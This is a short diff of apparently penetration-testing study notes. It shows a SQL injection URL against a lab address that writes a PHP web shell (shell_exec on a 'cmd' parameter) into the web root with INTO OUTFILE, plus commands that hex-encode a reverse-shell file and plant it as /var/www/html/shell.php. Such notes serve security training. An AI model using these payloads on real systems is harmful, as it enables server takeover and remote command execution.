@@ -311,11 +311,13 @@ https://www.exploit-db.com/papers/12886
 http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
 ```
 
-```Select 0x178d35c2348e79f238794ab134689a in outfile```
+```
+cat revshell.php | xxd -ps | tr -d '\n'
 
-```/var/www/html/shell.php```
+Select 0x178d35c2348e79f238794ab134689a in outfile /var/www/html/shell.php
+```
 
-```[cat revshell.php | xxd -ps | tr -d '\n']```
+
 
 # Buffer Overflow - Exploit Development
 Determine buffer needed to crash application.
